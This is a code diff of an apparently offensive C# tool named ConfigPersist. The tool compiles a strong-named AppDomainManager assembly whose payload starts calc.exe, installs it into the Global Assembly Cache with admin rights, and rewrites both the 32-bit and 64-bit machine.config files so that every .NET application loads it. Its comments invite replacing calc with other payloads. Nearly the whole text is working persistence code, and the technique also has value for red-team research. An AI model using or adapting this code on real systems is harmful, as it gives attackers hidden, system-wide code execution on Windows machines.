@@ -1,6 +1,5 @@
 ﻿// Author: NotoriousRebel
-// Project: ""
-// License: BSD 3-Clause
+// Project: ConfigPersist
 
 using System;
 using System.CodeDom.Compiler;
@@ -126,11 +125,18 @@ namespace ConfigPersist
             return true;
         }
 
-        private static Tuple<string, string> CompileDLL(string dllPath)
+        /// <summary>
+        /// Compiles our strong signed assembly based on code in string and places dll in dllPath.
+        /// </summary>
+        /// <param name="dllPath">Path where assembly will be placed</param>
+        /// <returns>Tuple containing path, assembly full name, and conext of assembly</returns>
+        private static Tuple<string, string, string> CompileDLL(string dllPath)
         {
+            // Feel free to change the name ConfigHooking or namespace
+            // Of course feel free to do more than just start calc :)
             var malCSharp = @"using System;
                 namespace Context {
-                    public sealed class ConfigHook : AppDomainManager {
+                    public sealed class ConfigHooking : AppDomainManager {
                         public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
                             System.Diagnostics.Process.Start(""calc.exe"");
                             return;
@@ -141,22 +147,33 @@ namespace ConfigPersist
             CodeDomProvider objCodeCompiler = CodeDomProvider.CreateProvider("CSharp");
             var name = "test";
 
-            // Generate name for dll
-            // string dllPath = $"{Environment.CurrentDirectory}\\{name}.dll";
+            // Generate name for strong signed .net assembly, will be name in GAC
             // Feel free to change name of output dll
             CompilerParameters cp = new CompilerParameters();
 
             // ADD reference assemblies here
             cp.ReferencedAssemblies.Add("System.dll");
             cp.TreatWarningsAsErrors = false;
-            dllPath = $"{dllPath}\\{name}1.dll";
+            dllPath = $"{dllPath}\\{name}.dll";
             cp.OutputAssembly = dllPath;
             cp.GenerateInMemory = false;
             cp.CompilerOptions = "/optimize";
             cp.CompilerOptions = "/keyfile:..\\..\\Keyfile\\key.snk";
             cp.IncludeDebugInformation = false;
             CompilerResults cr = objCodeCompiler.CompileAssemblyFromSource(cp, malCSharp);
-            Console.WriteLine(cr.PathToAssembly);
+            var types = cr.CompiledAssembly.GetExportedTypes();
+            string context;
+            try
+            {
+                context = types[0].ToString();
+                Console.WriteLine($"inside try context is: {context}");
+            }
+            catch (Exception)
+            {
+                Console.WriteLine("types does not have length greater than 0");
+                context = "null";
+            }
+
             string asmFullName;
             try
             {
@@ -166,7 +183,7 @@ namespace ConfigPersist
             {
                 Console.WriteLine("An exception occurred while trying to get fullname, most likely due to missing keyfile!");
                 Console.WriteLine(e);
-                asmFullName = "test, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null";
+                asmFullName = $"{name}, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null";
             }
 
             if (cr.Errors.Count > 0)
@@ -177,11 +194,11 @@ namespace ConfigPersist
                     Console.WriteLine(ce);
                 }
 
-                return Tuple.Create(string.Empty, string.Empty);
+                return Tuple.Create(string.Empty, string.Empty, string.Empty);
             }
             else
             {
-                return Tuple.Create(dllPath, asmFullName);
+                return Tuple.Create(dllPath, asmFullName, context);
             }
         }
 
@@ -192,7 +209,7 @@ namespace ConfigPersist
         /// </summary>
         /// <param name="configpath">Path to machine.config.</param>
         /// <param name="assemblyFullName">Full Name for Assembly.</param>
-        private static bool FixConfig(string configpath, string assemblyFullName)
+        private static bool FixConfig(string configpath, string assemblyFullName, string context)
         {
             try
             {
@@ -202,7 +219,7 @@ namespace ConfigPersist
                 XmlNode node = doc.SelectSingleNode("/configuration/runtime");
                 Console.WriteLine($"node is: {node}");
                 XmlElement ele = doc.CreateElement("appDomainManagerType");
-                ele.SetAttribute("value", "Context.ConfigHook");
+                ele.SetAttribute("value", context ?? "Context.ConfigHooking");
                 node.AppendChild(ele.Clone());
                 XmlElement secondEle = doc.CreateElement("appDomainManagerAssembly");
                 secondEle.SetAttribute("value", assemblyFullName);
@@ -225,15 +242,17 @@ namespace ConfigPersist
                 if (!IsAdminorSystem())
                 {
                     Console.WriteLine("Must be administrator for technique to work, exiting program!");
+                    Console.ReadLine();
                     Environment.Exit(-1);
                 }
 
                 Console.WriteLine(Environment.CurrentDirectory);
                 var dirPath = GetPath();
                 Console.WriteLine($"path is: {dirPath}");
-                (string dllPath, string asmFullName) = CompileDLL(dirPath);
+                (string dllPath, string asmFullName, string context) = CompileDLL(dirPath);
                 Console.WriteLine($"dllPath is {dllPath}");
                 Console.WriteLine($"asmFullName is: {asmFullName}");
+                Console.WriteLine($"context is: {context}");
                 bool loaded = InstallAssembly(dllPath);
                 if (loaded == false)
                 {
@@ -241,25 +260,25 @@ namespace ConfigPersist
                 }
 
                 Console.WriteLine($"Successfully added assembly to CLR: {asmFullName}");
-                var configPath = System.Runtime.InteropServices.RuntimeEnvironment.SystemConfigurationFile;
-                Console.WriteLine(configPath);
-                bool configFixed = FixConfig(configPath, asmFullName);
-                if (configFixed == false)
-                {
-                    throw new Exception("Unable to modify config");
-                }
 
-                // clean up after ourselves as it's been installed onto GAC
-                try
-                {
-                    //File.Delete(dllPath);
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine($"An error occurred while attempting to delete dllPath: {e}");
-                }
+                var sysConfigFile = System.Runtime.InteropServices.RuntimeEnvironment.SystemConfigurationFile;
+                Console.WriteLine($"sysConfigFile: {sysConfigFile}");
 
-                Console.ReadLine();
+                var paths = new List<string>()
+                {
+                     sysConfigFile,
+                     sysConfigFile.Contains("Framework") ? sysConfigFile.Replace("Framework", "Framework64") : sysConfigFile.Replace("Framework64", "Framework"),
+                };
+
+                // Hours wasted debugging this because it returns 32 bit version of .NET Framework
+                Console.WriteLine(paths);
+
+                foreach (var configPath in paths)
+                {
+                    Console.WriteLine($" ConfigPath: {configPath}");
+                    FixConfig(configPath, asmFullName, context);
+                    Console.ReadLine();
+                }
             }
             catch (Exception e)
             {
